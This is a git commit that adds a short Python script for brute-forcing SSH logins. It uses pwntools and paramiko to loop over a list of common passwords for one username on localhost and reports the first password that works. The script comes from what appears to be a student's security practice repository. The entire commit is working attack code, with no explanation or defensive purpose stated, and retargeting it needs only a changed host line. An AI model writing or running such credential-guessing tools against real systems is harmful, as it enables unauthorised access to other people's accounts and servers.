983077d24b1a04541a2f8fd7fd38b05e222422e1
bogiii97 <rb200109d@student.etf.bg.ac.rs>
2024-10-13 00:05:34 +0200

    ssh login brute force

---
+++ ssh_login_brute_force.py
@@ -0,0 +1,23 @@
+from pwn import *
+import paramiko
+
+
+host = "127.0.0.1"
+username = "bogi"
+attempts = 0
+
+
+with open("top-20-common-SSH-passwords.txt", "r") as password_list:
+	for password in password_list:
+		password = password.strip("\n")
+		try:
+			print("[{}] Attempting password: '{}'!".format(attempts,password))
+			response = ssh(host=host, user=username, password=password, timeout=1)
+			if response.connected():
+				print("[>] Valid password found: '{}'!".format(password))
+				response.close()
+				break
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid password!")
+		attempts += 1
